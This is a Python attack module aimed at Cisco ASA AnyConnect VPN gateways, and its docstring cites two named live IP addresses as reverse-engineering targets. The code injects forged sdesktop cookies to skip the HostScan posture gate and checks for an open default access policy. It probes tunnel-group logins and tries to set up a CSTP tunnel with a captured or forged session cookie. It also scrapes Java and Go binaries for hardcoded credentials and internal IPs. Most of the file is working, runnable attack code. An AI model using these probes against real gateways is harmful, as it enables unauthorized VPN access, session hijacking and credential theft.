"""
cisco_cstp_attack.py — Cisco ASA CSTP/HostScan/DAP protocol RE module.

Sources:
  - Cisco ASA All-in-One Firewall (3e) ch22 (CSD/DAP), ch23 (AnyConnect)
  - cisco-firewalls-moraes ch17 (AnyConnect CSTP)
  - Live session RE: 207.254.35.12 + 207.254.16.2

Architecture: 3-connection AnyConnect model
  Tunnel 4.1 Clientless:  TCP/443 SSLv3/RC4-SHA1  — initial portal/auth
  Tunnel 4.2 SSL-Tunnel:  TCP/443 TLSv1.0         — CSTP control channel
  Tunnel 4.3 DTLS-Tunnel: UDP/443 DTLSv1.0        — primary data path

CSTP handshake:
  Client → CONNECT /CSCOSSLC/tunnel HTTP/1.1
           Host: <ip>
           X-DTLS-CipherSuite: AES256-SHA:AES128-SHA:DES-CBC3-SHA
           Cookie: webvpn=<session_token>
  State:   HEADER_PROCESSING → WAIT_FOR_ADDRESS → HAVE_ADDRESS → ESTABLISHED

HostScan/CSD flow (ch22):
  1. GET / → redirect to /start.html (no sdesktop cookie)
  2. CSD client downloaded (ActiveX/Java/binary)
  3. Host scanned → data.xml match → DAP evaluation
  4. sdesktop cookie written client-side
  5. Session redirected to /+CSCOU+/logon.html
  6. Auth → DAP applies combined AAA+endpoint attrs

DAP bypass conditions:
  - DfltAccessPolicy: ALLOW_ALL if no custom DAP records match
  - CSD disabled per connection profile (ASA 8.2(1)+)
  - sdesktop cookie is client-writable — skip /start.html redirect
  - RADIUS class attr 25 (OU=GroupPolicyName) — no integrity protection

Stdlib only: urllib.request, urllib.error, ssl, socket, re, json, struct
"""

import urllib.request
import urllib.error
import ssl
import socket
import re
import json
import struct


# ---------------------------------------------------------------------------
# Transport helpers
# ---------------------------------------------------------------------------

def _make_ctx() -> ssl.SSLContext:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def _fetch(host, port, path, method='GET', body=None, headers=None, cookies=None):
    url = f'https://{host}:{port}{path}'
    hdrs = {
        'User-Agent': 'AnyConnect/4.10 (compatible)',
        'Accept': '*/*',
    }
    if headers:
        hdrs.update(headers)
    if cookies:
        hdrs['Cookie'] = '; '.join(f'{k}={v}' for k, v in cookies.items())

    req = urllib.request.Request(url, data=body, headers=hdrs, method=method)
    try:
        with urllib.request.urlopen(req, context=_make_ctx(), timeout=15) as resp:
            raw = resp.read()
            return {
                'status': resp.status,
                'headers': dict(resp.headers),
                'body': raw.decode('utf-8', errors='replace'),
                'error': None,
            }
    except urllib.error.HTTPError as e:
        try:
            body_text = e.read().decode('utf-8', errors='replace')
        except Exception:
            body_text = ''
        return {'status': e.code, 'headers': dict(e.headers), 'body': body_text, 'error': str(e)}
    except Exception as e:
        return {'status': None, 'headers': {}, 'body': '', 'error': str(e)}


def _raw_tls_send(host, port, payload: bytes, timeout=10) -> bytes:
    """
    Open raw TLS socket, send payload, read response.
    Used for CSTP CONNECT probe (non-standard HTTP upgrade).
    """
    ctx = _make_ctx()
    try:
        raw = socket.create_connection((host, port), timeout=timeout)
        tls = ctx.wrap_socket(raw, server_hostname=host)
        tls.settimeout(timeout)
        tls.sendall(payload)
        parts = []
        while True:
            try:
                chunk = tls.recv(4096)
                if not chunk:
                    break
                parts.append(chunk)
                if b'\r\n\r\n' in b''.join(parts):
                    break
            except socket.timeout:
                break
        tls.close()
        return b''.join(parts)
    except Exception:
        return b''


# ---------------------------------------------------------------------------
# Module: HostScan/CSD gate analysis
# ---------------------------------------------------------------------------

class HostScanGateRE:
    """
    Detect CSD/HostScan gate presence and probe bypass conditions.

    DAP key insight (book-confirmed): the sdesktop cookie is written by the
    CSD client (JavaScript-accessible, NOT HttpOnly). Setting a synthetic
    sdesktop cookie may skip the /start.html redirect entirely.
    """

    def __init__(self, host: str, port: int = 443):
        self.host = host
        self.port = port
        self.findings = []

    def probe_csd_redirect(self) -> dict:
        """
        GET / without sdesktop cookie.
        CSD-enabled ASA redirects to /start.html.
        CSD-disabled or no HostScan goes directly to logon.
        """
        r = _fetch(self.host, self.port, '/')
        location = r['headers'].get('Location', r['headers'].get('location', ''))
        body = r.get('body', '')

        has_csd = '/start.html' in location or '/start.html' in body
        has_logon = '/+CSCOU+/logon.html' in location or 'logon' in body.lower()
        return {
            'status': r['status'],
            'location': location,
            'csd_gate_active': has_csd,
            'direct_to_logon': has_logon and not has_csd,
            'error': r['error'],
        }

    def probe_sdesktop_bypass(self) -> dict:
        """
        Inject a synthetic sdesktop cookie to skip CSD redirect.
        Book ch22: sdesktop cookie written client-side by CSD JS — value is
        the session identifier token for the Secure Desktop vault.
        Hypothesis: any non-empty value may satisfy the gate check.
        """
        # Try multiple synthetic values
        candidates = [
            ('bypass', '1'),
            ('bypass', 'true'),
            ('bypass', 'deadbeef'),
        ]
        results = []
        for cookie_name, cookie_val in candidates:
            r = _fetch(self.host, self.port, '/', cookies={'sdesktop': cookie_val})
            location = r['headers'].get('Location', r['headers'].get('location', ''))
            bypassed = '/start.html' not in location and '/start.html' not in r.get('body', '')
            results.append({
                'cookie_value': cookie_val,
                'status': r['status'],
                'location': location,
                'csd_bypass_indicated': bypassed,
            })
        return {'probe': 'sdesktop_bypass', 'results': results}

    def probe_dap_default_policy(self) -> dict:
        """
        Detect DfltAccessPolicy posture.
        Book ch22: if no custom DAP records exist, DfltAccessPolicy = ALLOW_ALL.
        DAP eval error → logon page = DAP not configured (open).
        """
        # Message.html with mc=1 usually exposes DAP-related error codes
        r = _fetch(self.host, self.port, '/+CSCOE+/logon.html')
        body = r.get('body', '')
        # Look for DAP-specific error indicators
        dap_indicators = ['dap', 'access policy', 'DfltAccessPolicy', 'dynamic access']
        dap_mentioned = any(d.lower() in body.lower() for d in dap_indicators)
        return {
            'probe': 'dap_default_policy',
            'status': r['status'],
            'logon_accessible': r['status'] in (200, 302),
            'dap_mentioned_in_logon': dap_mentioned,
            'assessment': 'DAP not configured (open default likely)' if not dap_mentioned else 'DAP active',
        }

    def probe_group_lock_bypass(self, tunnel_groups: list) -> list:
        """
        Test connecting to each tunnel group via wrong-group POST.
        Book ref: webvpn_auth.c:http_webvpn_auth_accept logs group mismatch
        but may still auth under wrong group policy in some configurations.

        Returns list of {tunnel_group, group_alias, error_code, a0_value}
        """
        results = []
        for tg in tunnel_groups:
            body_str = (
                f'tg_name={tg.get("name","")}'
                f'&username=testuser&password=invalid'
                f'&Login=Login'
            )
            r = _fetch(
                self.host, self.port, '/+webvpn+/index.html',
                method='POST',
                body=body_str.encode(),
                headers={'Content-Type': 'application/x-www-form-urlencoded'},
                cookies={'tg': tg.get('tg_cookie', '')},
            )
            # Parse a0 response parameter (auth state machine)
            a0_m = re.search(r'a0\s*=\s*["\']?(\d+)["\']?', r.get('body', ''))
            results.append({
                'tunnel_group': tg.get('name'),
                'status': r['status'],
                'a0': a0_m.group(1) if a0_m else None,
                'error': r['error'],
            })
        return results

    def run(self, tunnel_groups: list = None) -> dict:
        self.findings = []
        csd = self.probe_csd_redirect()
        bypass = self.probe_sdesktop_bypass()
        dap = self.probe_dap_default_policy()
        gl = []
        if tunnel_groups:
            gl = self.probe_group_lock_bypass(tunnel_groups)

        if not csd['csd_gate_active']:
            self.findings.append('NO_CSD_GATE: HostScan not active, DAP posture gate absent')
        if any(r['csd_bypass_indicated'] for r in bypass['results']):
            self.findings.append('SDESKTOP_BYPASS: synthetic sdesktop cookie skips CSD redirect')
        if dap['assessment'].startswith('DAP not configured'):
            self.findings.append('DAP_OPEN: DfltAccessPolicy likely ALLOW_ALL')

        return {
            'host': self.host,
            'csd_gate': csd,
            'sdesktop_bypass': bypass,
            'dap_policy': dap,
            'group_lock_bypass': gl,
            'findings': self.findings,
        }


# ---------------------------------------------------------------------------
# Module: CSTP tunnel initiation probe
# ---------------------------------------------------------------------------

class CSTPTunnelRE:
    """
    Probe CSTP tunnel endpoint (/CSCOSSLC/tunnel).

    Book ch23 CSTP state machine:
      HEADER_PROCESSING → WAIT_FOR_ADDRESS → HAVE_ADDRESS → ESTABLISHED
      (→ ERROR → 503 if no address pool configured)

    The CONNECT upgrade uses the authenticated WebVPN session cookie (webvpn=).
    Without a valid session token, ASA returns 401 or 403.
    Presence of the endpoint indicates AnyConnect SSL-Tunnel is enabled.
    """

    DTLS_CIPHER_SUITES = 'AES256-SHA:AES128-SHA:DES-CBC3-SHA:DES-CBC-SHA'

    CSTP_CONNECT_TEMPLATE = (
        b'CONNECT /CSCOSSLC/tunnel HTTP/1.1\r\n'
        b'Host: {host}\r\n'
        b'User-Agent: Cisco AnyConnect VPN Agent for Windows 4.10.07073\r\n'
        b'Cookie: webvpn=\r\n'
        b'X-DTLS-CipherSuite: AES256-SHA:AES128-SHA:DES-CBC3-SHA\r\n'
        b'X-DTLS-Master-Secret: '
        b'0000000000000000000000000000000000000000000000000000000000000000\r\n'
        b'X-DTLS-Session-ID: 01020304050607080910111213141516\r\n'
        b'X-CSTP-Version: 1\r\n'
        b'X-CSTP-Hostname: attacker-host\r\n'
        b'X-CSTP-Accept-Encoding: deflate;q=1.0\r\n'
        b'X-CSTP-MTU: 1399\r\n'
        b'\r\n'
    )

    def __init__(self, host: str, port: int = 443):
        self.host = host
        self.port = port

    def probe_cstp_endpoint(self, session_token: str = '') -> dict:
        """
        Send CSTP CONNECT. Unauthenticated = 401/403.
        Any response = endpoint active.
        """
        tmpl = self.CSTP_CONNECT_TEMPLATE
        payload = tmpl.replace(b'webvpn=\r\n', f'webvpn={session_token}\r\n'.encode())
        payload = payload.replace(b'Host: {host}\r\n', f'Host: {self.host}\r\n'.encode())

        raw = _raw_tls_send(self.host, self.port, payload)
        if not raw:
            return {'active': False, 'status': None, 'raw_header': None}

        header_end = raw.find(b'\r\n\r\n')
        header_text = raw[:header_end].decode('utf-8', errors='replace') if header_end != -1 else raw[:512].decode('utf-8', errors='replace')
        status_m = re.match(r'HTTP/[\d.]+ (\d+)', header_text)
        status = int(status_m.group(1)) if status_m else None

        return {
            'active': True,
            'status': status,
            'raw_header': header_text[:400],
            'dtls_available': 'X-DTLS' in header_text or 'dtls' in header_text.lower(),
            'cstp_established': status == 200,
            'auth_required': status in (401, 403),
        }

    def probe_cstp_with_session(self, webvpn_cookie: str) -> dict:
        """
        Attempt CSTP with a captured/forged session cookie.
        HTTP 200 → tunnel initiated (ESTABLISHED state).
        ASA starts sending CSTP data frames: type-len-data, big-endian.
        """
        return self.probe_cstp_endpoint(session_token=webvpn_cookie)

    def analyze_dtls_fallback(self) -> dict:
        """
        If DTLS (UDP/443) is filtered, CSTP falls back to SSL-Tunnel.
        Book confirms: AES128+ required for DTLS; RC4-MD5/RC4-SHA causes DTLS failure.
        Check: probe UDP port 443 reachability.
        """
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(3)
            # DTLS ClientHello preamble (DTLSv1.0 record)
            dtls_hello = bytes.fromhex(
                'feff000000000000002b'  # DTLS record header
                '0100001f0000000000001f'  # ClientHello
                'feff' + '00' * 28 + '0002002f00'  # version + random + cipher
            )
            s.sendto(dtls_hello, (self.host, self.port))
            data, _ = s.recvfrom(1024)
            s.close()
            return {'dtls_udp_reachable': True, 'response_len': len(data)}
        except socket.timeout:
            return {'dtls_udp_reachable': False, 'reason': 'timeout — UDP/443 filtered'}
        except Exception as e:
            return {'dtls_udp_reachable': False, 'reason': str(e)}

    def run(self) -> dict:
        endpoint = self.probe_cstp_endpoint()
        dtls = self.analyze_dtls_fallback()
        findings = []
        if endpoint['active']:
            findings.append(f'CSTP_ACTIVE: /CSCOSSLC/tunnel responds (status={endpoint["status"]})')
        if not dtls['dtls_udp_reachable']:
            findings.append('DTLS_FILTERED: SSL-Tunnel fallback only (TCP/443)')
        return {
            'host': self.host,
            'cstp_endpoint': endpoint,
            'dtls_analysis': dtls,
            'findings': findings,
        }


# ---------------------------------------------------------------------------
# Module: ASDM JAR reverse engineering (Java class file format)
# ---------------------------------------------------------------------------

class ASDMJarClassRE:
    """
    Parse Java .class files from ASDM JARs.

    Class file layout (JVMS §4):
      magic(4) version(4) const_pool_count(2) const_pool[]
      access_flags(2) this_class(2) super_class(2)
      interfaces(2+) fields(2+) methods(2+) attributes(2+)

    Constant pool tag types of interest:
      1  CONSTANT_Utf8        — all string literals, class/method/field names
      7  CONSTANT_Class       — class references
      8  CONSTANT_String      — string constant references
      9  CONSTANT_Fieldref
      10 CONSTANT_Methodref
      11 CONSTANT_InterfaceMethodref

    Attack surface: hardcoded IPs, credentials, and API endpoint strings
    appear as CONSTANT_Utf8 entries loaded via `ldc` opcodes.
    """

    MAGIC = b'\xca\xfe\xba\xbe'

    def __init__(self, class_bytes: bytes, name: str = ''):
        self.data = class_bytes
        self.name = name
        self.pos = 0
        self.constants = []

    def _read(self, n: int) -> bytes:
        chunk = self.data[self.pos:self.pos + n]
        self.pos += n
        return chunk

    def _u1(self) -> int:
        return struct.unpack('>B', self._read(1))[0]

    def _u2(self) -> int:
        return struct.unpack('>H', self._read(2))[0]

    def _u4(self) -> int:
        return struct.unpack('>I', self._read(4))[0]

    def parse(self) -> dict:
        """
        Parse constant pool from class file.
        Returns {version, strings, class_refs, method_refs, ips, urls, findings}
        """
        if self.data[:4] != self.MAGIC:
            return {'error': 'not a .class file (no CAFEBABE magic)'}

        self.pos = 4
        minor = self._u2()
        major = self._u2()
        jdk_map = {46: '1.2', 49: '5', 50: '6', 51: '7', 52: '8', 55: '11', 61: '17'}
        jdk_ver = jdk_map.get(major, f'unknown (major={major})')

        cp_count = self._u2()
        self.constants = [None]  # 1-indexed

        i = 1
        while i < cp_count:
            tag = self._u1()
            if tag == 1:  # Utf8
                length = self._u2()
                value = self._read(length).decode('utf-8', errors='replace')
                self.constants.append({'tag': 1, 'value': value})
            elif tag == 7:  # Class
                idx = self._u2()
                self.constants.append({'tag': 7, 'name_idx': idx})
            elif tag == 8:  # String
                idx = self._u2()
                self.constants.append({'tag': 8, 'str_idx': idx})
            elif tag in (9, 10, 11):  # Fieldref, Methodref, InterfaceMethodref
                class_idx = self._u2()
                name_type_idx = self._u2()
                self.constants.append({'tag': tag, 'class_idx': class_idx, 'name_type_idx': name_type_idx})
            elif tag == 12:  # NameAndType
                name_idx = self._u2()
                desc_idx = self._u2()
                self.constants.append({'tag': 12, 'name_idx': name_idx, 'desc_idx': desc_idx})
            elif tag in (3, 4):  # Integer, Float
                self._read(4)
                self.constants.append({'tag': tag})
            elif tag in (5, 6):  # Long, Double (take 2 slots)
                self._read(8)
                self.constants.append({'tag': tag})
                self.constants.append(None)
                i += 1
            else:
                self.constants.append({'tag': tag})
            i += 1

        strings = [c['value'] for c in self.constants if c and c.get('tag') == 1]

        # Extract high-value strings
        ip_re = re.compile(r'\b(?:10|172|192)\.\d+\.\d+\.\d+\b')
        url_re = re.compile(r'https?://[^\s"\'<>]+', re.I)
        cred_re = re.compile(r'(?:password|passwd|pwd|secret|key|token|auth)\s*[=:]\s*\S+', re.I)

        ips = list({m for s in strings for m in ip_re.findall(s)})
        urls = list({m for s in strings for m in url_re.findall(s)})
        creds = [s for s in strings if cred_re.search(s) and len(s) < 200]
        cisco_paths = [s for s in strings if '/+CSCOE+/' in s or '/+CSCOU+/' in s or 'com.cisco' in s]
        api_paths = [s for s in strings if re.match(r'^/[a-zA-Z]', s) and 2 < len(s) < 120]

        findings = []
        if ips:
            findings.append(f'INTERNAL_IPS: {ips}')
        if creds:
            findings.append(f'CREDENTIAL_STRINGS: {len(creds)} found')
        if cisco_paths:
            findings.append(f'CISCO_PATHS: {cisco_paths[:10]}')

        return {
            'class': self.name,
            'jdk_version': jdk_ver,
            'constant_pool_size': cp_count,
            'utf8_strings': len(strings),
            'internal_ips': ips,
            'urls': urls[:20],
            'credential_strings': creds[:10],
            'cisco_paths': cisco_paths,
            'api_paths': api_paths[:20],
            'findings': findings,
        }


# ---------------------------------------------------------------------------
# Module: Go binary RE (orka3 / macOS tooling)
# ---------------------------------------------------------------------------

class GoBinaryRE:
    """
    Static RE for Go binaries (e.g., orka3).

    Go calling conventions (1.17+ register-based, Linux amd64 System V):
      Integer args: AX, BX, CX, DI, SI, R8, R9, R10, R11
      Float args:   X0-X14
      Return:       same register set

    Go string layout: struct{ptr uintptr; len int} — NOT null-terminated.
    Symbol table preserved unless stripped with -ldflags="-s -w".

    Extraction techniques (no disassembler, strings-only):
      1. Go module dependencies from build info section
      2. Internal IP/URL extraction from string table
      3. Interface implementation table (go:itab) → type graph
      4. Command structure from cmd/* package function names
      5. Config key extraction from json struct tags
    """

    def __init__(self, binary_path: str):
        self.path = binary_path
        self._strings_cache = None

    def _get_strings(self, min_len: int = 8) -> list:
        if self._strings_cache is not None:
            return self._strings_cache
        try:
            import subprocess
            result = subprocess.run(
                ['strings', f'-{min_len}', self.path],
                capture_output=True, text=True, timeout=120
            )
            self._strings_cache = result.stdout.splitlines()
            return self._strings_cache
        except Exception:
            return []

    def extract_module_info(self) -> dict:
        """Extract Go module dependencies from binary build info."""
        strs = self._get_strings(6)
        modules = {}
        for line in strs:
            if line.startswith('dep\t') or line.startswith('mod\t'):
                parts = line.split('\t')
                if len(parts) >= 3:
                    modules[parts[1]] = parts[2]
        go_ver = next((s for s in strs if s.startswith('go1.')), None)
        return {
            'go_version': go_ver,
            'modules': modules,
            'module_count': len(modules),
        }

    def extract_internal_endpoints(self) -> dict:
        """Extract internal IPs, URLs, API paths."""
        strs = self._get_strings(8)
        ip_re = re.compile(r'\b(10\.\d{1,3}\.\d{1,3}\.\d{1,3})\b')
        url_re = re.compile(r'https?://[a-zA-Z0-9.\-]+(:\d+)?(/[^\s"\']{0,80})?')
        api_re = re.compile(r'^/(?:api|v[0-9]|orka|cluster|node|vm|image|iso|user|token|auth|health|ready)[a-zA-Z0-9/_\-{}]*$')

        ips = {}
        for line in strs:
            for m in ip_re.finditer(line):
                ip = m.group(1)
                ips[ip] = line.strip()[:120]

        urls = []
        for line in strs:
            for m in url_re.finditer(line):
                u = m.group(0)
                if not any(x in u for x in ['kubernetes.io', 'github.com', 'golang.org', 'google.', 'w3c.org', 'ietf.org']):
                    urls.append(u)

        api_paths = list({s for s in strs if api_re.match(s.split('invalid')[0].split('json')[0].strip())})

        return {
            'internal_ips': ips,
            'urls': list(set(urls))[:30],
            'api_paths': api_paths[:30],
        }

    def extract_config_keys(self) -> list:
        """Extract JSON struct tag config keys from the binary."""
        strs = self._get_strings(6)
        keys = []
        for line in strs:
            m = re.search(r'json:"([a-zA-Z0-9_\-]+)(?:",omitempty)?', line)
            if m:
                keys.append(m.group(1))
        return sorted(set(keys))

    def extract_command_surface(self) -> dict:
        """Extract CLI command surface from Go package function names."""
        strs = self._get_strings(8)
        cmds = {}
        for line in strs:
            m = re.match(r'cmd/([a-zA-Z_\-]+)\.([A-Z][a-zA-Z]+)', line)
            if m:
                pkg, fn = m.group(1), m.group(2)
                cmds.setdefault(pkg, []).append(fn)
        return cmds

    def extract_credentials(self) -> list:
        """Find hardcoded credential-adjacent strings."""
        strs = self._get_strings(8)
        cred_re = re.compile(r'(password|passwd|secret|key|token|cred|auth).*', re.I)
        results = []
        for line in strs:
            if cred_re.search(line) and len(line) < 200:
                # Filter out pure code/format strings
                if not any(x in line for x in ['%v', '%s', '%w', 'func(', 'interface', 'struct{']):
                    results.append(line.strip())
        return results[:30]

    def run(self) -> dict:
        modules = self.extract_module_info()
        endpoints = self.extract_internal_endpoints()
        config_keys = self.extract_config_keys()
        commands = self.extract_command_surface()
        creds = self.extract_credentials()

        findings = []
        if endpoints['internal_ips']:
            findings.append(f'INTERNAL_IPS: {list(endpoints["internal_ips"].keys())}')
        if creds:
            findings.append(f'CREDENTIAL_MATERIAL: {len(creds)} strings')
        if modules['modules']:
            findings.append(f'MODULE_GRAPH: {list(modules["modules"].keys())[:5]}')

        return {
            'binary': self.path,
            'module_info': modules,
            'endpoints': endpoints,
            'config_keys': config_keys,
            'command_surface': {k: len(v) for k, v in commands.items()},
            'credential_material': creds,
            'findings': findings,
        }


# ---------------------------------------------------------------------------
# Top-level analysis entry point
# ---------------------------------------------------------------------------

def analyze_asa_attack_surface(host: str, port: int = 443,
                                tunnel_groups: list = None) -> dict:
    """
    Full Cisco ASA CSTP/HostScan/DAP attack surface analysis.
    Returns structured findings.
    """
    results = {}

    hs = HostScanGateRE(host, port)
    results['hostscan_dap'] = hs.run(tunnel_groups=tunnel_groups or [])

    cstp = CSTPTunnelRE(host, port)
    results['cstp_tunnel'] = cstp.run()

    all_findings = (
        results['hostscan_dap']['findings'] +
        results['cstp_tunnel']['findings']
    )
    results['summary'] = {
        'host': host,
        'port': port,
        'total_findings': len(all_findings),
        'findings': all_findings,
    }
    return results


def analyze_go_binary(binary_path: str) -> dict:
    """Static RE of a Go binary."""
    return GoBinaryRE(binary_path).run()


def analyze_java_class(class_bytes: bytes, name: str = '') -> dict:
    """Parse a Java .class file constant pool."""
    return ASDMJarClassRE(class_bytes, name).parse()
